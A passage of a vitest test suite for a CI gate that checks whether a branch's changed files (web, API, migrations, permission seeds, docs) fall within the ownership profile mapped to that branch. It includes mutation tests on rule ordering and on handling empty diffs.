/**
 * Mutation tests for the phase changed-file ownership gate.
 *
 * The expensive failure this prevents is not a broken build. It is a Backend or
 * Database change riding inside a Frontend phase: reviewed as Frontend, gated
 * by no Backend job, and invisible until it breaks something in production.
 *
 * The second half of this file — from "a pull-request context resolves a
 * profile" onwards — is about the OTHER way a gate stops working: not a wrong
 * verdict, but no verdict at all, reported as success. See
 * `decideOwnershipRun()`.
 */
import { readFileSync, readdirSync } from 'node:fs';
import { dirname, join } from 'node:path';
import { fileURLToPath } from 'node:url';
import { describe, expect, it } from 'vitest';
import {
  CLASSIFIERS,
  DEFAULT_BASE,
  PROFILE_MAP_PATH,
  PROFILES,
  PROTECTED_BRANCHES,
  PULL_REQUEST_EVENTS,
  classify,
  decideOwnershipRun,
  envFileBody,
  emptyDiffAgreesWithTrees,
  evaluate,
  shellQuote,
} from '../../scripts/ci/check-phase-ownership.mjs';

const REPO_ROOT = join(dirname(fileURLToPath(import.meta.url)), '..', '..');
const WORKFLOWS = join(REPO_ROOT, '.github', 'workflows');
const NODE_QUALITY = join(WORKFLOWS, '_reusable-node-quality.yml');

/**
 * True when a workflow's top-level `on:` block names `pull_request`.
 *
 * Scanned line by line rather than matched with a regex. The regex form of this
 * — `/^on:\s*$\n(?:\s+.*$\n)*?\s{2}pull_request:/m` — backtracks
 * catastrophically on the files where it does NOT match, because `\s+` and `.*`
 * can divide the same line between them in exponentially many ways. It hung the
 * suite rather than failing it, which is the one outcome worse than red.
 */
function firesOnPullRequest(source: string): boolean {
  const lines = source.split(/\r?\n/);
  const start = lines.findIndex((l) => /^on:\s*$/.test(l));
  if (start === -1) return false;
  for (let i = start + 1; i < lines.length; i += 1) {
    const line = lines[i] ?? '';
    if (line.trim() === '' || line.startsWith('#')) continue;
    // The block ends at the first line that is not indented.
    if (!/^\s/.test(line)) return false;
    if (/^ {2}pull_request:/.test(line)) return true;
  }
  return false;
}

/** The real committed branch → profile map, so the cases are about real rules. */
const RULES = JSON.parse(readFileSync(join(REPO_ROOT, PROFILE_MAP_PATH), 'utf8')).rules as {
  branchPrefix: string;
  profile: string;
}[];

describe('classify', () => {
  it('places each path in the bucket that owns it', () => {
    expect(classify('apps/web/src/features/authentication/login/LoginForm.tsx')).toBe('web');
    expect(classify('apps/api/src/app/api/v1/users/route.ts')).toBe('apiSource');
    expect(classify('apps/api/package.json')).toBe('apiConfig');
    expect(classify('supabase/migrations/0120_new.sql')).toBe('migrations');
    expect(classify('supabase/config.toml')).toBe('supabase');
    expect(classify('docs/phase-1/phase-1-26/task-register.md')).toBe('docs');
    expect(classify('scripts/ci/check-api-backend-only.mjs')).toBe('tooling');
    expect(classify('.github/workflows/pr-ci.yml')).toBe('tooling');
    expect(classify('tests/ci/phase-ownership.test.ts')).toBe('tests');
    expect(classify('package.json')).toBe('rootConfig');
    expect(classify('Dockerfile')).toBe('rootConfig');
  });

  it('classifies a migration as a migration, never merely as supabase', () => {
    // Order matters: the specific rule must win, or a new migration would be
    // permitted anywhere `supabase` is permitted.
    expect(classify('supabase/migrations/0001_extensions.sql')).toBe('migrations');
  });
});

describe('p1-26-frontend profile', () => {
  const FRONTEND_CHANGES = [
    'apps/web/src/features/authentication/login/LoginForm.tsx',
    'apps/web/tests/login.dom.test.tsx',
    'docs/phase-1/phase-1-26/task-register.md',
    'scripts/ci/check-phase-ownership.mjs',
    'tests/ci/phase-ownership.test.ts',
    'package.json',
  ];

  it('permits a Frontend phase to change web, docs, tooling, tests and root config', () => {
    const { failures, counts } = evaluate(FRONTEND_CHANGES, 'p1-26-frontend');
    expect(failures).toEqual([]);
    expect(counts.web).toBeGreaterThan(0);
    expect(counts.changed).toBe(FRONTEND_CHANGES.length);
  });

  it.each([
    ['API source', 'apps/api/src/modules/iam/application/user-service.ts', 'apiSource'],
    ['API config', 'apps/api/next.config.ts', 'apiConfig'],
    ['a migration', 'supabase/migrations/0120_p1_26.sql', 'migrations'],
    ['the database', 'supabase/config.toml', 'supabase'],
  ])('fails when a Frontend phase changes %s', (_label, path, bucket) => {
    const { failures } = evaluate([...FRONTEND_CHANGES, path], 'p1-26-frontend');
    expect(failures.some((f) => f.startsWith(`${bucket}:`) && f.includes(path))).toBe(true);
  });

  it('names the Backend remediation as the route for an API change', () => {
    // The gate must not merely refuse — a refusal with no route is where a
    // Backend change gets smuggled in instead of being separated.
    const { failures } = evaluate(
      [...FRONTEND_CHANGES, 'apps/api/src/modules/iam/application/authentication-service.ts'],
      'p1-26-frontend'
    );
    expect(failures.some((f) => f.includes('Backend remediation'))).toBe(true);
  });

  it('fails on an unclassified file rather than shrugging', () => {
    const { failures } = evaluate([...FRONTEND_CHANGES, 'weird/place/thing.bin'], 'p1-26-frontend');
    expect(failures.some((f) => f.includes('unclassified changed file'))).toBe(true);
  });

  it('fails on an empty change set rather than passing vacuously', () => {
    // Every rule iterates the changed set, so an empty set judges nothing. That
    // is indistinguishable — FROM THE FILE LIST ALONE — from a diff against the
    // wrong base ref. Nothing here establishes the trees, so nothing here can
    // tell those apart, and the refusal stands.
    const { failures } = evaluate([], 'p1-26-frontend');
    expect(failures.some((f) => f.includes('broken comparison'))).toBe(true);
  });

  it('refuses an empty change set when the trees DISAGREE — the broken measurement', () => {
    /*
     * The world this guard was written for: a diff that produced no output while
     * the two commits name different trees. Something is wrong with the
     * comparison — a stale base ref, a sparse checkout, a wrong argument — and
     * no verdict can be read off it.
     */
    const { failures } = evaluate([], 'p1-26-frontend', false);
    expect(
      failures.some((f) => f.includes('broken comparison')),
      'an empty diff over differing trees was accepted'
    ).toBe(true);
  });

  it('accepts an empty change set when the trees AGREE — a branch that changes nothing', () => {
    /*
     * A SYNC MERGE: protected `main` merged into `develop` so a promotion can
     * satisfy its up-to-date rule. It changes zero files by construction, and
     * changing zero files is exactly what makes it safe to land.
     *
     * `git diff <base>...HEAD` runs from the merge base to the head, so an empty
     * file list is truthful precisely when those two name the same tree. That is
     * a fact about objects, not a branch name, and it is the only thing that can
     * separate this world from the one above.
     *
     * Refusing it would have left one repair available — inventing a file change
     * to satisfy a gate — which is the repair this gate exists to prevent.
     */
    const { failures, counts } = evaluate([], 'repository-tooling', true);
    expect(failures, 'a branch that changes nothing was refused').toEqual([]);
    expect(counts.unchanged, 'the empty result was not reported as such').toBe(1);
    expect(counts.changed, 'a file was counted that does not exist').toBe(0);
  });

  it('does not let the trees excuse a NON-empty change set', () => {
    /*
     * The flag answers one question — whether an EMPTY list is truthful — and it
     * must not become a way past the rules that follow. A forbidden file is
     * forbidden whatever the trees say.
     */
    const { failures } = evaluate(
      [...FRONTEND_CHANGES, 'supabase/migrations/9999_whatever.sql'],
      'p1-26-frontend',
      true
    );
    expect(
      failures.length,
      'tree agreement waved a forbidden path through a non-empty change set'
    ).toBeGreaterThan(0);
  });

  describe('what the trees say about an empty diff', () => {
    /*
     * The rule above turns on one input, and an input nothing can exercise is an
     * input nobody has checked. On the branch that needed this — a sync merge —
     * the moment the fix itself is committed the branch HAS changes, so the
     * empty-diff path stops being reachable there and would go untested for as
     * long as it survives. So the question is asked of a reader, and the reader
     * is asked here.
     */
    const SHA = (c: string): string => c.repeat(40);
    const world =
      (table: Record<string, string | null>) =>
      (args: readonly string[]): string | null =>
        // `?? null` and not a bare index: an absent key and a key whose value is
        // `null` are the same answer here — Git refused — and the index
        // signature would otherwise widen this to `undefined`.
        table[args.join(' ')] ?? null;

    it('reports agreement when the merge base and HEAD name one tree', () => {
      const answer = emptyDiffAgreesWithTrees(
        'origin/develop',
        world({
          'merge-base origin/develop HEAD': `${SHA('a')}\n`,
          [`rev-parse ${SHA('a')}^{tree}`]: `${SHA('b')}\n`,
          'rev-parse HEAD^{tree}': `${SHA('b')}\n`,
        })
      ) as { truthful: boolean; mergeBase: string; tree: string } | null;
      expect(answer, 'the reader refused a world it could answer').not.toBeNull();
      expect(answer?.truthful, 'identical trees were not read as agreement').toBe(true);
      expect(answer?.mergeBase).toBe(SHA('a'));
      expect(answer?.tree).toBe(SHA('b'));
    });

    it('reports DISagreement when they name different trees', () => {
      const answer = emptyDiffAgreesWithTrees(
        'origin/develop',
        world({
          'merge-base origin/develop HEAD': `${SHA('a')}\n`,
          [`rev-parse ${SHA('a')}^{tree}`]: `${SHA('b')}\n`,
          'rev-parse HEAD^{tree}': `${SHA('c')}\n`,
        })
      ) as { truthful: boolean } | null;
      expect(answer?.truthful, 'differing trees were read as agreement').toBe(false);
    });

    it.each([
      ['the merge base', 'merge-base origin/develop HEAD'],
      ['the base tree', `rev-parse ${SHA('a')}^{tree}`],
      ['the head tree', 'rev-parse HEAD^{tree}'],
    ])('returns null when Git will not name %s', (_what, refused) => {
      /*
       * A question Git declined to answer has not been answered. `null` is what
       * that means here, and the caller turns it into the refusal — never into
       * "the trees agree", which is the fail-open this whole guard exists to
       * prevent.
       */
      const table: Record<string, string | null> = {
        'merge-base origin/develop HEAD': `${SHA('a')}\n`,
        [`rev-parse ${SHA('a')}^{tree}`]: `${SHA('b')}\n`,
        'rev-parse HEAD^{tree}': `${SHA('b')}\n`,
      };
      table[refused] = null;
      expect(
        emptyDiffAgreesWithTrees('origin/develop', world(table)),
        'a refusal was read as an answer'
      ).toBeNull();
    });

    it('returns null on an answer that is present but not a commit', () => {
      // An empty string is an answer, and it is not a sha. Reading it as one
      // would compare two blanks and call them equal.
      expect(
        emptyDiffAgreesWithTrees(
          'origin/develop',
          world({ 'merge-base origin/develop HEAD': '\n' })
        ),
        'a blank was accepted as a commit'
      ).toBeNull();
    });
  });

  it('rejects an unknown profile instead of defaulting to a permissive one', () => {
    const { failures } = evaluate(FRONTEND_CHANGES, 'no-such-profile');
    expect(failures.some((f) => f.includes('unknown ownership profile'))).toBe(true);
  });
});

describe('a profile refuses a bucket it never claimed', () => {
  /*
   * The declaration used to be advisory in one direction. `allowed` narrowed
   * nothing on its own: only a bucket written into `forbidden` was refused, so a
   * bucket named in NEITHER list passed every rule — while the file said, in a
   * docblock directly above it, that anything not listed is forbidden.
   *
   * Six profiles permitted `webGenerated` that way. Worse than the six: adding a
   * twelfth bucket to the classifier would have widened every profile in the file
   * at once, silently, with no line of any profile changing.
   */
  it('refuses an undeclared bucket, and says which profile did not claim it', () => {
    const generated = ['apps/web/src/lib/api/idempotent-operations.ts'];
    for (const profile of ['p1-26-frontend', 'p1-27-frontend', 'backend-login-contract']) {
      const { failures } = evaluate(generated, profile);
      expect(
        failures.length,
        `${profile} silently permitted a bucket it never claimed`
      ).toBeGreaterThan(0);
      expect(failures[0], `${profile} refused without naming itself`).toContain(profile);
      expect(failures[0]).toContain('does not claim');
    }
  });

  it('still prefers the profile author own words when there are any', () => {
    // `forbidden` stopped deciding; it did not stop explaining. A declared
    // refusal must still read in the words whoever wrote the profile chose.
    const { failures } = evaluate(['supabase/migrations/0001_x.sql'], 'p1-26-frontend');
    expect(failures[0], 'a declared reason was replaced by the generic one').toContain(
      'a Frontend phase must not change a migration'
    );
  });

  it('leaves an allowed bucket allowed', () => {
    expect(
      evaluate(['apps/web/src/app/page.tsx'], 'p1-26-frontend').failures,
      'closing the hole started refusing a bucket the profile does claim'
    ).toEqual([]);
  });
});

describe('the permission catalogue is a bucket of its own', () => {
  /*
   * `supabase/seeds/04_iam_permission_catalog.sql` IS the canonical permission
   * catalogue: 116 rows at the time of writing — pinned by `permissionCount` in
   * `.github/ci-baselines/schema-baseline.json` rather than by this sentence — the
   * only shipping insert into `iam.permissions`, and ZERO migrations write to that
   * table. Any change that adds a permission has to
   * land there.
   *
   * Rolled into the `supabase` bucket it could only ever be granted alongside
   * `config.toml` and the local bootstrap — a different question with a different
   * answer. So it is separated, and each profile answers the two questions apart.
   *
   * This bucket is also the case the `allowed`-decides rule was written for. It is
   * the twelfth bucket, and it landed REFUSED by every profile that had not
   * claimed it. Under the rule it replaced, adding it would have silently widened
   * all twelve profiles at once.
   */
  const CATALOGUE = 'supabase/seeds/04_iam_permission_catalog.sql';

  it('classifies the catalogue apart from the harness, and after migrations', () => {
    expect(classify(CATALOGUE), 'the catalogue fell into the harness bucket').toBe('dbSeeds');
    expect(classify('supabase/config.toml'), 'the harness moved').toBe('supabase');
    expect(classify('supabase/migrations/0001_x.sql'), 'a migration moved').toBe('migrations');

    // Order matters: a catch-all `supabase/` rule declared first would swallow
    // both of the buckets above.
    const order = CLASSIFIERS.map((c) => c.bucket);
    expect(
      order.indexOf('dbSeeds'),
      'dbSeeds is declared after the supabase catch-all'
    ).toBeLessThan(order.indexOf('supabase'));
    expect(
      order.indexOf('migrations'),
      'migrations is declared after the supabase catch-all'
    ).toBeLessThan(order.indexOf('supabase'));
  });

  it('lets the PRE-P1-29 Backend lane seed a permission without opening the harness', () => {
    for (const profile of ['pre-p1-29-backend', 'pre-p1-29-initiative']) {
      expect(
        evaluate([CATALOGUE], profile).failures,
        `${profile} cannot add a permission, which is the one database change it needs`
      ).toEqual([]);
      expect(
        evaluate(['supabase/config.toml'], profile).failures.length,
        `${profile} was handed the database harness`
      ).toBeGreaterThan(0);
    }
  });

  it('keeps a screen out of the catalogue', () => {
    const { failures } = evaluate([CATALOGUE], 'pre-p1-29-web');
    expect(failures.length, 'the Web lane may seed a permission').toBeGreaterThan(0);
    expect(failures[0]).toContain('must not seed a permission');
  });

  it('does not quietly take seed authority from the profiles that already had it', () => {
    /*
     * Both of these held the catalogue through the wider `supabase` bucket.
     * Splitting a bucket must not narrow a profile that never asked to be
     * narrowed — that would be a behaviour change smuggled in as a refactor.
     */
    for (const profile of ['p1-18-read-surface', 'p1-15-evidence-foundation']) {
      expect(
        evaluate([CATALOGUE], profile).failures,
        `${profile} lost seed authority when the bucket was split`
      ).toEqual([]);
      expect(
        evaluate(['supabase/config.toml'], profile).failures,
        `${profile} lost harness authority when the bucket was split`
      ).toEqual([]);
    }
  });

  it('refuses the new bucket everywhere it was never claimed', () => {
    for (const profile of ['p1-26-frontend', 'p1-27-frontend', 'repository-tooling']) {
      expect(
        evaluate([CATALOGUE], profile).failures.length,
        `${profile} silently gained the permission catalogue when the bucket was added`
      ).toBeGreaterThan(0);
    }
  });
});

describe('PRE-P1-29 ownership — an initiative that spans the product, in lanes that do not', () => {
  /*
   * PRE-P1-29 is an initiative rather than a phase, and it legitimately needs API
   * routes, migrations that seed permissions, and the screens that operate them.
   * One profile spanning all of that would forbid nothing and so declare nothing,
   * which is why there are three: two lanes that each hold one review boundary,
   * and an integration profile for the branch that receives both.
   */
  const INITIATIVE_RULES = JSON.parse(readFileSync(PROFILE_MAP_PATH, 'utf8')).rules as {
    branchPrefix?: string;
    profile?: string;
  }[];
  const resolve = (headBranch: string) =>
    decideOwnershipRun({
      headBranch,
      baseRef: 'develop',
      eventName: 'pull_request',
      rules: INITIATIVE_RULES,
    }) as { action: string; profile: string | null };

  it('resolves the initiative branch and each lane to its own profile', () => {
    expect(
      resolve('feature/pre-p1-29-multi-tenant-administration-rbac-workflow').profile,
      'the initiative branch does not resolve to its own profile'
    ).toBe('pre-p1-29-initiative');
    expect(resolve('feature/pre-p1-29-backend-platform-admin').profile).toBe('pre-p1-29-backend');
    expect(resolve('feature/pre-p1-29-web-superadmin').profile).toBe('pre-p1-29-web');
    expect(resolve('chore/pre-p1-29-admin-rbac-ownership').profile).toBe('repository-tooling');
  });

  it('maps the initiative by its FULL name, so it cannot swallow the lanes', () => {
    /*
     * First match wins. A rule keyed on `feature/pre-p1-29-` would match both lane
     * branches too and — being listed for the widest profile — would hand the Web
     * lane the API and the Backend lane the screens. The narrower rules are listed
     * first AND the initiative rule is the whole branch name, so an unmapped
     * sibling is refused rather than absorbed.
     */
    const stray = resolve('feature/pre-p1-29-something-nobody-mapped');
    expect(stray.action, 'an unmapped PRE-P1-29 branch was absorbed by the initiative rule').toBe(
      'refuse'
    );
    expect(stray.profile).toBeNull();

    const order = INITIATIVE_RULES.map((r) => r.branchPrefix ?? '');
    const backend = order.indexOf('feature/pre-p1-29-backend-');
    const web = order.indexOf('feature/pre-p1-29-web-');
    const initiative = order.indexOf('feature/pre-p1-29-multi-tenant-administration-rbac-workflow');
    expect(backend, 'the Backend lane rule is missing').toBeGreaterThanOrEqual(0);
    expect(web, 'the Web lane rule is missing').toBeGreaterThanOrEqual(0);
    expect(initiative, 'the initiative rule is missing').toBeGreaterThanOrEqual(0);
    expect(backend, 'the initiative rule precedes the Backend lane').toBeLessThan(initiative);
    expect(web, 'the initiative rule precedes the Web lane').toBeLessThan(initiative);
  });

  it('still refuses a branch nobody mapped at all', () => {
    expect(resolve('nobody/mapped-this').action).toBe('refuse');
  });

  /*
   * The matrix. Each row is a path this initiative might plausibly touch, under
   * one profile — asserted per row so a failure names the lane that stopped
   * meaning what it meant.
   */
  const MATRIX: [string, string, boolean][] = [
    ['pre-p1-29-initiative', 'apps/api/src/routes/platform/companies.ts', true],
    ['pre-p1-29-initiative', 'supabase/migrations/20260822090000_platform_admin.sql', true],
    ['pre-p1-29-initiative', 'apps/web/src/app/superadmin/companies/page.tsx', true],
    ['pre-p1-29-initiative', 'tests/backend/platform-companies.test.ts', true],
    ['pre-p1-29-initiative', 'docs/phase-1/pre-p1-29/scope.md', true],
    ['pre-p1-29-initiative', 'apps/api/package.json', false],
    ['pre-p1-29-initiative', 'supabase/seed.sql', false],
    ['pre-p1-29-initiative', 'some/unknown/place/thing.bin', false],

    ['pre-p1-29-backend', 'apps/api/src/routes/platform/companies.ts', true],
    ['pre-p1-29-backend', 'supabase/migrations/20260822090000_platform_admin.sql', true],
    ['pre-p1-29-backend', 'apps/web/src/lib/api/idempotent-operations.ts', true],
    ['pre-p1-29-backend', 'apps/web/src/app/superadmin/companies/page.tsx', false],
    ['pre-p1-29-backend', 'apps/api/package.json', false],
    ['pre-p1-29-backend', 'supabase/seed.sql', false],
    ['pre-p1-29-backend', 'some/unknown/place/thing.bin', false],

    ['pre-p1-29-web', 'apps/web/src/app/superadmin/companies/page.tsx', true],
    ['pre-p1-29-web', 'tests/web/role-editor.test.ts', true],
    ['pre-p1-29-web', 'apps/api/src/routes/platform/companies.ts', false],
    ['pre-p1-29-web', 'supabase/migrations/20260822090000_platform_admin.sql', false],
    ['pre-p1-29-web', 'apps/web/src/lib/api/idempotent-operations.ts', false],
    ['pre-p1-29-web', 'apps/api/package.json', false],
    ['pre-p1-29-web', 'supabase/seed.sql', false],
    ['pre-p1-29-web', 'some/unknown/place/thing.bin', false],
  ];

  it.each(MATRIX)('%s: %s', (profile, path, allowed) => {
    const { failures } = evaluate([path], profile);
    if (allowed) {
      expect(failures, `${profile} refused a path it is supposed to own`).toEqual([]);
    } else {
      expect(failures.length, `${profile} permitted ${path}`).toBeGreaterThan(0);
      expect(failures[0], 'the refusal explains nothing').toContain(path);
    }
  });

  it('keeps the two lanes disjoint where it matters', () => {
    /*
     * The property the lanes exist for, stated once rather than inferred from the
     * rows above: neither lane can land both halves of a contract change.
     */
    const screen = 'apps/web/src/app/superadmin/companies/page.tsx';
    const route = 'apps/api/src/routes/platform/companies.ts';
    expect(
      evaluate([route, screen], 'pre-p1-29-backend').failures.length,
      'the Backend lane accepted a screen'
    ).toBeGreaterThan(0);
    expect(
      evaluate([route, screen], 'pre-p1-29-web').failures.length,
      'the Web lane accepted an API route'
    ).toBeGreaterThan(0);
  });
});

describe('P1-29 ownership — a MIXED phase, in lanes that are not mixed', () => {
  /*
   * P1-29 is Backend prerequisites first and screens second, so it gets three
   * profiles rather than one. Before BR-08a added them, `remediation/p1-29-*`,
   * `feature/p1-29-*` and BOTH live `planning/*` branches matched no rule at
   * all — `unmappedPolicy` is FAIL, so none of them could have opened a pull
   * request. That is what these rules fix, and what these tests hold.
   */
  const RULES = JSON.parse(readFileSync(PROFILE_MAP_PATH, 'utf8')).rules as {
    branchPrefix?: string;
    profile?: string;
  }[];
  const resolveWith = (rules: typeof RULES, headBranch: string) =>
    decideOwnershipRun({
      headBranch,
      baseRef: 'develop',
      eventName: 'pull_request',
      rules,
    }) as { action: string; profile: string | null };
  const resolve = (headBranch: string) => resolveWith(RULES, headBranch);

  it('resolves each P1-29 lane to its own profile', () => {
    expect(resolve('remediation/p1-29-backend-br-01-technician-identity').profile).toBe(
      'p1-29-backend'
    );
    expect(resolve('feature/p1-29-work-orders').profile).toBe('p1-29-frontend');
    expect(resolve('planning/p1-29-work-order-diagnostics-technician-preparation').profile).toBe(
      'p1-29-planning'
    );
    expect(resolve('planning/pre-p1-29-remaining-waves-and-p1-29-a0').profile).toBe(
      'p1-29-planning'
    );
  });

  it('leaves BR-08a itself under repository-tooling, so no slice legislates its own compliance', () => {
    /*
     * BR-08a adds these rules. It is deliberately not one of them: it changes a
     * gate, its suite and the baseline it reads, which is `repository-tooling`'s
     * declared subject and already had a rule. A branch that added the rule it
     * was then judged by would be declaring nothing about itself.
     */
    expect(resolve('chore/pre-p1-29-br-08a-permission-parity-foundation').profile).toBe(
      'repository-tooling'
    );
  });

  it('refuses a P1-29 branch nobody mapped rather than absorbing it', () => {
    // There is deliberately no broad `remediation/p1-29-` rule.
    expect(resolve('remediation/p1-29-frontend-something').action).toBe('refuse');
    expect(resolve('p1-29/anything').action).toBe('refuse');
  });

  it('lists the Backend lane before any broader rule could reach it', () => {
    const order = RULES.map((r) => r.branchPrefix ?? '');
    const backend = order.indexOf('remediation/p1-29-backend-');
    expect(backend, 'the P1-29 Backend lane rule is missing').toBeGreaterThanOrEqual(0);
    const broader = order.findIndex(
      (p) => p !== 'remediation/p1-29-backend-' && 'remediation/p1-29-backend-'.startsWith(p)
    );
    if (broader !== -1) {
      expect(
        broader,
        `rule '${order[broader]}' precedes the P1-29 Backend lane and shadows it`
      ).toBeGreaterThan(backend);
    }
  });

  it('MUTATION: a broader rule placed first shadows the Backend lane', () => {
    /*
     * The ordering invariant, proved by breaking it rather than by asserting an
     * index. First match wins, so a general `remediation/p1-29-` rule listed
     * above the lane hands every Backend slice the wrong profile — silently,
     * because both answers are a valid profile name.
     */
    const shadowed = [{ branchPrefix: 'remediation/p1-29-', profile: 'p1-29-planning' }, ...RULES];
    expect(
      resolveWith(shadowed, 'remediation/p1-29-backend-br-01').profile,
      'a broader rule placed first did NOT shadow the lane — the ordering invariant is not real'
    ).toBe('p1-29-planning');
    // And the same rule placed after the lane cannot reach it.
    const ordered = [...RULES, { branchPrefix: 'remediation/p1-29-', profile: 'p1-29-planning' }];
    expect(resolveWith(ordered, 'remediation/p1-29-backend-br-01').profile).toBe('p1-29-backend');
  });

  it('MUTATION: removing a P1-29 rule returns that branch to refusal', () => {
    for (const prefix of ['remediation/p1-29-backend-', 'feature/p1-29-', 'planning/']) {
      const without = RULES.filter((r) => r.branchPrefix !== prefix);
      const branch = prefix === 'planning/' ? 'planning/p1-29-preparation' : `${prefix}something`;
      expect(
        resolveWith(without, branch).action,
        `removing '${prefix}' left ${branch} resolving to something`
      ).toBe('refuse');
    }
  });

  const MATRIX: [string, string, boolean][] = [
    // The Backend lane owns the contract and everything that seeds it.
    ['p1-29-backend', 'apps/api/src/app/api/v1/technicians/me/queue/route.ts', true],
    ['p1-29-backend', 'apps/api/src/modules/technician/application/roster-service.ts', true],
    ['p1-29-backend', 'supabase/migrations/20260901090000_wo_job_work_logs.sql', true],
    ['p1-29-backend', 'supabase/seeds/04_iam_permission_catalog.sql', true],
    ['p1-29-backend', 'apps/web/src/lib/api/idempotent-operations.ts', true],
    ['p1-29-backend', 'tests/backend/p1-29-technician-roster.test.ts', true],
    ['p1-29-backend', 'docs/phase-1/pre-p1-29-backend-remediation/br-03.md', true],
    ['p1-29-backend', 'apps/web/src/features/work-orders/board.tsx', false],
    ['p1-29-backend', 'apps/web/src/features/appointments/appointments-contract.ts', false],
    ['p1-29-backend', 'apps/api/package.json', false],
    ['p1-29-backend', 'supabase/config.toml', false],
    ['p1-29-backend', 'some/unknown/place/thing.bin', false],

    // The Frontend lane owns the screens and nothing that defines a contract.
    ['p1-29-frontend', 'apps/web/src/features/work-orders/board.tsx', true],
    ['p1-29-frontend', 'apps/web/src/features/work-orders/work-orders-contract.ts', true],
    ['p1-29-frontend', 'tests/ci/p1-29-adapter-reachability.test.ts', true],
    ['p1-29-frontend', 'docs/phase-1/phase-1-29/canonical-plan.md', true],
    ['p1-29-frontend', 'apps/api/src/app/api/v1/jobs/route.ts', false],
    ['p1-29-frontend', 'supabase/migrations/20260901090000_wo_job_work_logs.sql', false],
    ['p1-29-frontend', 'supabase/seeds/04_iam_permission_catalog.sql', false],
    ['p1-29-frontend', 'apps/web/src/lib/api/idempotent-operations.ts', false],
    ['p1-29-frontend', 'apps/web/tests/p1-28-qa.test.ts', false],
    ['p1-29-frontend', 'apps/api/package.json', false],

    // Planning owns documents and nothing else at all.
    ['p1-29-planning', 'docs/phase-1/pre-p1-29-backend-remediation/README.md', true],
    ['p1-29-planning', 'scripts/ci/check-permission-parity.mjs', false],
    ['p1-29-planning', 'tests/ci/permission-parity.test.ts', false],
    ['p1-29-planning', '.github/workflows/pr-ci.yml', false],
    ['p1-29-planning', 'package.json', false],
    ['p1-29-planning', 'apps/api/src/app/api/v1/jobs/route.ts', false],
    ['p1-29-planning', 'apps/web/src/features/work-orders/board.tsx', false],
    ['p1-29-planning', 'supabase/migrations/20260901090000_wo_job_work_logs.sql', false],
  ];

  it.each(MATRIX)('%s: %s', (profile, path, allowed) => {
    const { failures } = evaluate([path], profile);
    if (allowed) {
      expect(failures, `${profile} refused a path it is supposed to own`).toEqual([]);
    } else {
      expect(failures.length, `${profile} permitted ${path}`).toBeGreaterThan(0);
      expect(failures[0], 'the refusal explains nothing').toContain(path);
    }
  });

  it('keeps the P1-29 lanes disjoint across the boundary that matters', () => {
    const screen = 'apps/web/src/features/work-orders/board.tsx';
    const route = 'apps/api/src/app/api/v1/jobs/route.ts';
    expect(
      evaluate([route, screen], 'p1-29-backend').failures.length,
      'the P1-29 Backend lane accepted a screen'
    ).toBeGreaterThan(0);
    expect(
      evaluate([route, screen], 'p1-29-frontend').failures.length,
      'the P1-29 Frontend lane accepted an API route'
    ).toBeGreaterThan(0);
  });

  it('permits no P1-29 profile to change API workspace configuration or the database harness', () => {
    for (const profile of ['p1-29-backend', 'p1-29-frontend', 'p1-29-planning']) {
      for (const path of ['apps/api/package.json', 'supabase/config.toml']) {
        expect(
          evaluate([path], profile).failures.length,
          `${profile} permitted ${path}`
        ).toBeGreaterThan(0);
      }
    }
  });

  it('leaves every pre-existing rule resolving exactly as it did', () => {
    /*
     * The regression that matters most: three rules were appended, and appending
     * to a first-match-wins list can only change an answer by matching something
     * an earlier rule already matched. Asserted rather than reasoned.
     */
    const unchanged: [string, string][] = [
      ['feature/p1-26-authentication', 'p1-26-frontend'],
      ['feature/p1-27-crm-vehicle', 'p1-27-frontend'],
      ['feature/p1-28-appointment', 'p1-27-frontend'],
      ['remediation/p1-28-owner-qa-backend', 'p1-28-backend-owner-qa'],
      ['remediation/p1-28-something-else', 'p1-27-frontend'],
      ['remediation/p1-27-partner-identity', 'p1-27-backend-partner-identity'],
      ['remediation/p1-15-evidence', 'p1-15-evidence-foundation'],
      ['chore/pre-p1-29-admin-rbac-ownership', 'repository-tooling'],
      ['feature/pre-p1-29-backend-platform-admin', 'pre-p1-29-backend'],
      ['feature/pre-p1-29-web-superadmin', 'pre-p1-29-web'],
      ['tooling/no-fake-data-comments', 'repository-tooling'],
    ];
    for (const [branch, profile] of unchanged) {
      expect(resolve(branch).profile, `${branch} no longer resolves to ${profile}`).toBe(profile);
    }
    expect(resolve('nobody/mapped-this').action).toBe('refuse');
  });
});

describe('api-boundary profile', () => {
  it('permits the remediation to change API source and tooling', () => {
    const { failures } = evaluate(
      [
        'apps/api/src/app/api/health/route.ts',
        'apps/api/package.json',
        'scripts/ci/check-api-backend-only.mjs',
        'docs/phase-1/phase-1-26/preflight/findings.md',
      ],
      'api-boundary'
    );
    expect(failures).toEqual([]);
  });

  it('still forbids the remediation from touching migrations or the database', () => {
    const { failures } = evaluate(
      ['apps/api/package.json', 'supabase/migrations/0120_x.sql'],
      'api-boundary'
    );
    expect(failures.some((f) => f.includes('must not change a migration'))).toBe(true);
  });
});

describe('backend-login-contract profile', () => {
  const BACKEND_CHANGES = [
    'apps/api/src/modules/iam/application/authentication-service.ts',
    'apps/api/src/modules/iam/provider/supabase-provider.ts',
    'apps/api/src/app/api/v1/auth/login/route.ts',
    'tests/backend/iam-auth-provider.test.ts',
    'docs/phase-1/phase-1-26/login-identity-contract.md',
    'scripts/ci/check-phase-ownership.mjs',
  ];

  it('permits the login-contract remediation to change API source, tests and docs', () => {
    const { failures, counts } = evaluate(BACKEND_CHANGES, 'backend-login-contract');
    expect(failures).toEqual([]);
    expect(counts.apiSource).toBeGreaterThan(0);
  });

  it('forbids the Frontend half from riding along in the Backend change', () => {
    // The point of a separate profile. A Backend profile that also permitted
    // `web` would let both halves of a contract change land in one commit that
    // neither the Frontend nor the Backend review would see whole — the same
    // hole `p1-26-frontend` closes, merely pointing the other way.
    const { failures } = evaluate(
      [...BACKEND_CHANGES, 'apps/web/src/features/authentication/login/LoginForm.tsx'],
      'backend-login-contract'
    );
    expect(failures.some((f) => f.startsWith('web:'))).toBe(true);
  });

  it.each([
    ['a migration', 'supabase/migrations/0121_login.sql', 'migrations'],
    ['the database', 'supabase/config.toml', 'supabase'],
  ])('still forbids %s', (_label, path, bucket) => {
    const { failures } = evaluate([...BACKEND_CHANGES, path], 'backend-login-contract');
    expect(failures.some((f) => f.startsWith(`${bucket}:`) && f.includes(path))).toBe(true);
  });
});

describe('p1-27-backend-partner-identity profile', () => {
  /*
   * This profile exists because seven API source files were riding inside the
   * P1-27 FRONTEND branch — reviewed by nobody as Backend and triggered by no
   * Backend gate, which is the exact failure `p1-26-frontend` was written to
   * stop and which it caught here.
   */
  const BACKEND_CHANGES = [
